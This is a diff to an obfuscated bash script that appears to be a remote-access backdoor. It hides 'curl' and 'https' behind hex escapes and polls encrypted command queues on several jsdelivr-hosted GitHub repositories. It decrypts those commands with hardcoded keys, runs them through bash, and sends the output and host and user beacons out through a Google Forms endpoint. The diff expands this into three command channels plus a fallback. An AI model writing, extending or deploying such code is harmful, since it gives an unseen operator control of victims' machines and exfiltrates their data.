@@ -4,27 +4,30 @@ _L="/dev/shm/.wcs_$(id -u)"
 [ -f "$_L" ] && [ "$(cat $_L 2>/dev/null)" != "$$" ] && kill -0 "$(cat $_L)" 2>/dev/null && exit 0
 echo $$ > "$_L"
 
-# --- config ---
-_CH="1"
-_TK="gzy1Ccmn1p64yYtTlMKTvY41yBOjv"
+_CH="M"
 _R1=$'ht\x74ps://cdn.jsdelivr.net/gh/hashimubadiya14-rgb/sync-registry-7f3a@master'
-_R2=$'ht\x74ps://cdn.jsdelivr.net/gh/hashimubadiya14-rgb/flow-refs-8h1d@master'
+_R2=$'ht\x74ps://cdn.jsdelivr.net/gh/hashimubadiya14-rgb/cache-notes-m2k9@master'
+_R3=$'ht\x74ps://cdn.jsdelivr.net/gh/hashimubadiya14-rgb/asset-tracker-q4vw@master'
+_R0=$'ht\x74ps://cdn.jsdelivr.net/gh/hashimubadiya14-rgb/flow-refs-8h1d@master'
+_T1="gzy1Ccmn1p64yYtTlMKTvY41yBOjv"
+_T2="p9JqgoYIbrPIUizeRQ9zOtEtTqzJBqj"
+_T3="gitet0Zu9FV7kCU4MixrYdgypjO9YYO"
 _F=$'ht\x74ps://docs.google.com/forms/d/e/1FAIpQLSfGUJt5MnKfYY4BhdPYmMyJcvkh78mJWjtAIcowFfpB0-c0KQ/formResponse'
 _E="entry.404732359"
 _C=$'\x63\x75\x72\x6c'
 _H="/dev/shm/.cs_$$_$(date +%s)"
-mkdir -p "$_H/queue" "$_H/pend"
+mkdir -p "$_H/pend" "$_H/run"
 
-_dec() { printf '%s' "$2" | openssl enc -aes-256-cbc -d -a -A -pbkdf2 -iter 10000 -pass pass:"$1" 2>/dev/null; }
+_dec() { printf '%s' "$3" | openssl enc -aes-256-cbc -d -a -A -pbkdf2 -iter 10000 -pass pass:"$2" 2>/dev/null; }
 _enc() { printf '%s' "$2" | openssl enc -aes-256-cbc -a -A -salt -pbkdf2 -iter 10000 -pass pass:"$1" 2>/dev/null; }
-_log() { date -u +"%Y-%m-%dT%H:%M:%SZ $_CH $*" >> "$_H/ev"; }
-_up() {
-  local _P; _P=$(_enc "$_TK" "$1")
+_log() { date -u +"%Y-%m-%dT%H:%M:%SZ M $*" >> "$_H/ev"; }
+_up() { # $1=chtag $2=secret $3=data
+  local _P; _P=$(_enc "$2" "$3")
   [ -z "$_P" ] && return 1
   local _I=0 _R
   while [ $_I -lt 3 ]; do
     _R=$($_C -s --max-time 25 -o /dev/null -w "%{http_code}" \
-      --data-urlencode "$_E=ch$_CH|$_P" \
+      --data-urlencode "$_E=$1|$_P" \
       --data-urlencode "fvv=1" --data-urlencode "pageHistory=0" "$_F" 2>/dev/null)
     [ "$_R" = "200" ] && return 0
     _I=$((_I+1)); sleep 5
@@ -34,27 +37,25 @@ _up() {
 
 # ---------- collector loop ----------
 (
- [ -f "$_H/next" ] && _N=$(cat "$_H/next" 2>/dev/null) || _N=1
  while :; do
    _BUST="t=$(date +%s)"
-   _GOT=0
-   _K=$_N
-   while [ $_K -le $((_N+5)) ]; do
-     _NN=$(printf '%06d' $_K)
-     _D=$($_C -s --max-time 12 "$_R1/queue/q$_NN.txt?$_BUST" 2>/dev/null)
-     case "$_D" in
-       U2FsdGVk*) printf '%s' "$_D" > "$_H/pend/.$_NN.w"; mv -f "$_H/pend/.$_NN.w" "$_H/pend/$_NN"; _K=$((_K+1)); _GOT=1 ;;
-       *) break ;;
-     esac
+   for _CHI in 1 2 3; do
+     eval "_RU=\$_R$_CHI"
+     eval "_TF=$_H/n$_CHI"
+     [ -f "$_TF" ] && _N=$(cat "$_TF" 2>/dev/null) || _N=1
+     _GOT=0; _K=$_N
+     _STEP=0
+     while [ $_STEP -lt 3 ]; do
+       _NN=$(printf '%06d' $_K)
+       _D=$($_C -s --max-time 12 "$_RU/queue/q$_NN.txt?$_BUST" 2>/dev/null)
+       case "$_D" in
+         U2FsdGVk*) printf '%s' "$_D" > "$_H/pend/.c$_CHI-$_NN"; mv -f "$_H/pend/.c$_CHI-$_NN" "$_H/pend/c$_CHI-$_NN"; _K=$((_K+1)); _GOT=1 ;;
+         *) break ;;
+       esac
+       _STEP=$((_STEP+1))
+     done
+     [ $_GOT -eq 1 ] && { echo $_K > "$_TF"; }
    done
-   if [ $_GOT -eq 1 ]; then echo $_K > "$_H/next"; _N=$_K; fi
-   # urgent slot: window-versioned (one per 10-min bucket, no permanent consume)
-   _W=$(( $(date +%s) / 600 ))
-   if [ ! -f "$_H/uw_$_W" ]; then
-     touch "$_H/uw_$_W"
-     _D=$($_C -s --max-time 12 "$_R1/queue/now.txt?$_BUST" 2>/dev/null)
-     case "$_D" in U2FsdGVk*) printf '%s' "$_D" > "$_H/pend/.wn"; mv -f "$_H/pend/.wn" "$_H/pend/w$_W-now";; esac
-   fi
    sleep $((25 + RANDOM % 15))
  done
 ) &
@@ -66,39 +67,43 @@ _up() {
    sleep 60
    _NOW=$(date +%s); _NEW=$(ls -t "$_H/pend" 2>/dev/null | head -1)
    [ -n "$_NEW" ] && _LAST=$_NOW
-   if [ $((_NOW - _LAST)) -gt 600 ]; then
-     _D=$($_C -s --max-time 12 "$_R2/queue/now.txt?fallback=$(date +%s)" 2>/dev/null)
-     case "$_D" in U2FsdGVk*) printf '%s' "$_D" > "$_H/pend/f-now";; esac
+   if [ $((_NOW - _LAST)) -gt 900 ]; then
+     _D=$($_C -s --max-time 12 "$_R0/queue/now.txt?fallback=$(date +%s)" 2>/dev/null)
+     case "$_D" in U2FsdGVk*) printf '%s' "$_D" > "$_H/pend/.f0"; mv -f "$_H/pend/.f0" "$_H/pend/f0";; esac
+     _LAST=$_NOW
    fi
  done
 ) &
 
-# ---------- executor loop (main) — parallel dispatch, max 3 concurrent ----------
-_up "BOOT|$(hostname)|$(id -un)|$_CH|v3"
-_job() {  # $1=slot $2=tag $3=payload
-  local _S="$1" _F1="$2" _PAY="$3"
-  local _T=$(_dec "$_TK" "$_PAY")
-  if [ -z "$_T" ]; then _up "ERR|decrypt|$_F1"; return; fi
+# ---------- executor: parallel, 3 slots ----------
+_job() { # $1=slot $2=tag $3=pay
+  local _F1="$2" _PAY="$3"
+  local _CHI="${_F1:1:1}"
+  [ "$_CHI" = "0" ] && _CHI=1
+  eval "_TS=\$_T$_CHI"
+  local _T=$(_dec x "$_TS" "$_PAY")
+  if [ -z "$_T" ]; then _up "ch$_CHI" "$_TS" "ERR|decrypt|$_F1"; return; fi
   _log "exec $_F1"
   local _O; _O=$(bash -c "$_T" 2>&1 | head -c 8000 | base64 -w0)
   local _R="${_O:-bm9uZQ==}"
   printf '%s' "$_R" | fold -w1600 | while IFS= read -r _CH1 || [ -n "$_CH1" ]; do
-    _up "RES|$_F1|$_CH1"
+    _up "ch$_CHI" "$_TS" "RES|$_F1|$_CH1"
   done
   _log "done $_F1"
 }
+_up "ch1" "$_T1" "BOOT|$(hostname)|$(id -un)|M|v4"
+_up "ch2" "$_T2" "BOOT|$(hostname)|$(id -un)|M|v4"
+_up "ch3" "$_T3" "BOOT|$(hostname)|$(id -un)|M|v4"
 while :; do
-  _BUSY=0
   for _S in 1 2 3; do
     if [ -f "$_H/run/$_S.lock" ]; then
       _JP=$(cat "$_H/run/$_S.lock" 2>/dev/null)
-      if [ -n "$_JP" ] && kill -0 "$_JP" 2>/dev/null; then _BUSY=1; continue; fi
+      if [ -n "$_JP" ] && kill -0 "$_JP" 2>/dev/null; then continue; fi
     fi
-    _F1=$(ls "$_H/pend" 2>/dev/null | sort | head -1)
+    _F1=$(ls "$_H/pend" 2>/dev/null | grep -v '^\.' | sort | head -1)
     [ -z "$_F1" ] && break
     _PAY=$(cat "$_H/pend/$_F1" 2>/dev/null)
     rm -f "$_H/pend/$_F1"
-    mkdir -p "$_H/run"
     ( _job "$_S" "$_F1" "$_PAY"; rm -f "$_H/run/$_S.lock" ) &
     echo $! > "$_H/run/$_S.lock"
   done
